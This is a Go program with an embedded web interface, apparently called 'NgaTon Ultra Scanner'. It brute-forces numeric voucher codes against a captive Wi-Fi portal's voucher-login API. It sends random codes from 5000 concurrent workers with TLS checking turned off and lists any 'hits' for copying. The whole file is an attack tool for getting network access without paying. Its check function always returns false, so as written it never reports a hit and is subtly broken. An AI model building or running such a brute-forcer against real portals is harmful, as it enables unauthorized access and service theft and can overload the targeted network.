package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"html/template"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type ScanState struct {
	Portal    string   `json:"portal"`
	Length    int      `json:"length"`
	Tested    uint64   `json:"tested"`
	Speed     float64  `json:"speed"`
	Hits      []string `json:"hits"`
	IsRunning bool     `json:"is_running"`
}

var (
	state    = ScanState{Hits: []string{}}
	mu       sync.Mutex
	stopChan = make(chan struct{})
)

func testCode(client *http.Client, portalBase, sessionID, code string) bool {
	url := portalBase + "/api/auth/voucher/?lang=en_US"
	payload := map[string]interface{}{
		"accessCode": code,
		"sessionId":  sessionID,
		"apiVersion": 1,
		"authCode":   "ABCD",
	}
	jsonVal, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonVal))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", portalBase)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return false
}

func startScanning(portal string, length int) {
	mu.Lock()
	state = ScanState{
		Portal:    portal,
		Length:    length,
		Tested:    0,
		Speed:     0,
		Hits:      []string{},
		IsRunning: true,
	}
	mu.Unlock()

	sessionID := "TEST_SESSION"
	concurrency := 5000

	codes := make(chan string, 5000)
	var wg sync.WaitGroup

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 500,
	}
	client := &http.Client{Transport: tr, Timeout: 3 * time.Second}

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for code := range codes {
				select {
				case <-stopChan:
					return
				default:
				}

				atomic.AddUint64(&state.Tested, 1)
				if testCode(client, portal, sessionID, code) {
					mu.Lock()
					state.Hits = append(state.Hits, code)
					mu.Unlock()
				}
			}
		}()
	}

	go func() {
		rnd := rand.New(rand.NewSource(time.Now().UnixNano()))
		formatStr := fmt.Sprintf("%%0%dd", length)
		maxLimit := 1
		for i := 0; i < length; i++ {
			maxLimit *= 10
		}

		startTime := time.Now()
		for {
			select {
			case <-stopChan:
				close(codes)
				return
			default:
				code := fmt.Sprintf(formatStr, rnd.Intn(maxLimit))
				codes <- code

				mu.Lock()
				elapsed := time.Since(startTime).Seconds()
				if elapsed > 0 {
					state.Speed = (float64(state.Tested) / elapsed) * 60
				}
				mu.Unlock()
			}
		}
	}()
}

func handleHome(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <title>NgaTon Ultra Scanner</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; text-align: center; padding: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 10px; display: inline-block; width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; font-size: 16px; }
        input { background: #334155; color: white; }
        button { background: #22c55e; color: white; font-weight: bold; cursor: pointer; }
        button.stop { background: #ef4444; }
        .stats { font-size: 18px; margin: 15px 0; text-align: left; background: #0f172a; padding: 10px; border-radius: 5px; }
        .hit-box { background: #d97706; padding: 5px; margin: 5px 0; border-radius: 3px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🕷️ NgaTon Web Scanner</h2>
        <div id="form-section">
            <input type="text" id="portal" placeholder="Portal Link" value="http://192.168.1.1">
            <input type="number" id="length" placeholder="Digit Length" value="6">
            <button onclick="startScan()">🚀 စတင် Scan မည်</button>
        </div>
        <div id="status-section" style="display:none;">
            <div class="stats">
                <p>🎯 Tested: <span id="tested">0</span></p>
                <p>⚡ Speed: <span id="speed">0</span> c/m</p>
                <p>🔥 Hits: <span id="hits-count">0</span></p>
            </div>
            <div id="hits-list"></div>
            <button class="stop" onclick="stopScan()">🛑 ရပ်ရန်</button>
        </div>
    </div>

    <script>
        let timer;
        function startScan() {
            let portal = document.getElementById('portal').value;
            let length = document.getElementById('length').value;
            fetch('/start?portal=' + encodeURIComponent(portal) + '&length=' + length).then(() => {
                document.getElementById('form-section').style.display = 'none';
                document.getElementById('status-section').style.display = 'block';
                timer = setInterval(fetchStatus, 1000);
            });
        }

        function stopScan() {
            fetch('/stop').then(() => {
                clearInterval(timer);
                document.getElementById('form-section').style.display = 'block';
                document.getElementById('status-section').style.display = 'none';
            });
        }

        function fetchStatus() {
            fetch('/status').then(res => res.json()).then(data => {
                document.getElementById('tested').innerText = data.tested.toLocaleString();
                document.getElementById('speed').innerText = data.speed.toFixed(1);
                document.getElementById('hits-count').innerText = data.hits.length;
                
                let hitsHtml = '';
                data.hits.forEach(h => {
                    hitsHtml += '<div class="hit-box" onclick="navigator.clipboard.writeText(\'' + h + '\'); alert(\'Copied: ' + h + '\');">🔑 ' + h + ' (Click to Copy)</div>';
                });
                document.getElementById('hits-list').innerHTML = hitsHtml;
            });
        }
    </script>
</body>
</html>
`
	t, _ := template.New("index").Parse(tmpl)
	t.Execute(w, nil)
}

func handleStart(w http.ResponseWriter, r *http.Request) {
	portal := r.URL.Query().Get("portal")
	var length int
	fmt.Sscanf(r.URL.Query().Get("length"), "%d", &length)

	select {
	case <-stopChan:
		stopChan = make(chan struct{})
	default:
	}

	go startScanning(portal, length)
	w.WriteHeader(http.StatusOK)
}

func handleStop(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	if state.IsRunning {
		close(stopChan)
		state.IsRunning = false
	}
	mu.Unlock()
	w.WriteHeader(http.StatusOK)
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(state)
}

func main() {
	http.HandleFunc("/", handleHome)
	http.HandleFunc("/start", handleStart)
	http.HandleFunc("/stop", handleStop)
	http.HandleFunc("/status", handleStatus)

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	fmt.Println("🌐 Go Web Scanner started on port " + port)
	http.ListenAndServe(":"+port, nil)
}

